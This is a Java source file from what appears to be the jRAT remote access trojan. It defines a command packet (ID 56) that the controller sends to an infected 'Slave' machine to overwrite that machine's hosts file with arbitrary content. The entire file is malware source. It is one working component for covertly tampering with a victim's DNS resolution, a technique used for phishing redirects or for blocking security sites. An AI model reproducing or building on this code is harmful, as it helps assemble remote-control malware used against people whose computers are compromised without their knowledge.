package pro.jrat.client.packets.outgoing;

import java.io.DataOutputStream;

import pro.jrat.client.Slave;

public class Packet56UpdateHostsFile extends AbstractOutgoingPacket {

	private String content;

	public Packet56UpdateHostsFile(String content) {
		this.content = content;
	}

	@Override
	public void write(Slave slave, DataOutputStream dos) throws Exception {
		slave.writeLine(content);
	}

	@Override
	public byte getPacketId() {
		return 56;
	}

}
